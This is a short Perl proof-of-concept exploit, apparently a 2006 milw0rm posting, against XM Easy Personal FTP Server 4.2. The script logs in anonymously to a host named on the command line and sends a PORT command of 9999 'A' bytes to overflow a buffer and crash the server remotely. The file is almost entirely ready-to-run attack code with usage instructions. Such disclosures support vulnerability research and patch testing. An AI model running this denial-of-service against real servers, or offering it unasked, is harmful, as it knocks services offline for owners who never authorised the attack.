#!/usr/bin/perl

# ---------------------------------------------------- #
# Name        : XM Easy Personal FTP Server            #
# Version     : 4.2                                    #
# ---------------------------------------------------- #
#	Type        : dos / remote 	               #
# Descritpion : buffer overflow for huge PORT value    #
# ---------------------------------------------------- #
# luka.research - id:28022006001                       #
# ---------------------------------------------------- #

use Net::FTP;

$host = @ARGV[0];

if ($host)
{
	$ftp = Net::FTP->new($host, Debug => 0);
	$ftp->login("anonymous",'me@here.there');
	$ftp->port("\x41"x9999);
}         
else {
	print "\n- XM Easy Personal FTP Server 4.2 - PoC Exploit\n- Using: $0 host\n"; 
}  

# milw0rm.com [2006-03-04]
